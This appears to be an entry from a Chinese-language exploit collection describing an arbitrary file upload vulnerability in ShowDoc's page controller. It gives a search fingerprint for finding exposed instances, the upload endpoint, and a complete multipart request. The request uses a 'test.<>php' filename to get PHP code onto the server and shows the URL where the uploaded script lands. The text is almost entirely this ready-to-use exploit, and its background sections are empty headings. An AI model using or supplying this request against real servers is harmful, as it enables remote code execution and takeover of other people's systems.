# ShowDocPageController存在任意文件上传漏洞

- **系统**：ShowDocPageController　|　**类型**：文件上传　|　**CVE**：—
- **指纹**：`app="ShowDoc"`
- **请求**：`POST /index.php?s=/home/page/uploadImg HTTP/1.1`
- **关键头**：`Content-Length: 241`　`Content-Type: multipart/form-data; boundary=--------------------------9213…`

**请求体 / payload**
```
----------------------------921378126371623762173617
Content-Disposition: form-data; name="editormd-image-file"; filename="test.<>php"
Content-Type: text/plain
<?php phpinfo();?>
----------------------------921378126371623762173617--
http://127.0.0.1:8000/Public/Uploads/2024-05-30/66577ab51bb29.php
```

**其他**
- ShowDoc PageController存在任意文件上传漏洞: * 一、漏洞简介
* 二、影响版本
* 三、资产测绘
* 四、漏洞复现
***
- 版本: * ShowDoc